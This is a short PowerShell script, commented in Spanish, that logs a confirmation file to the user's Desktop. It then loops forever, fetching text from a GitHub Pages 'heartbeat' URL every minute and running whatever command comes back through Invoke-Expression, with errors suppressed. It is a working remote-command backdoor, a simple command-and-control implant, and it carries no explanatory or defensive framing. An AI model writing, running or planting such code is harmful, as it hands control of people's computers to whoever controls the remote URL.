# Confirmar ejecución
"Se ejecutó correctamente el $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\ejecucion_confirmada.txt" -Append

# Bucle de heartbeat
while ($true) {
    try {
        $response = Invoke-WebRequest -Uri "https://fieropapagayo.github.io/1/heartbeat" -UseBasicParsing -TimeoutSec 10
        $command = $response.Content.Trim()
        if ($command -and $command -ne "OK") {
            $result = Invoke-Expression $command 2>&1 | Out-String
        }
    } catch {}
    Start-Sleep -Seconds 60
}
